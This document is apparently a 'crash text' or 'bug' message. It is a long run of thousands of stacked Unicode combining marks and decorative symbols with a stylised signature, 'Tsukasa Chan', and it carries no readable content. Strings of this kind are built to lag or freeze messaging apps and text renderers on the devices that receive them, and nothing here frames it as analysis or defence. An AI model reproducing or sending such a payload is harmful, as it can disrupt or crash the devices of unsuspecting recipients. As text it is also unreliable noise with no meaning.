⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝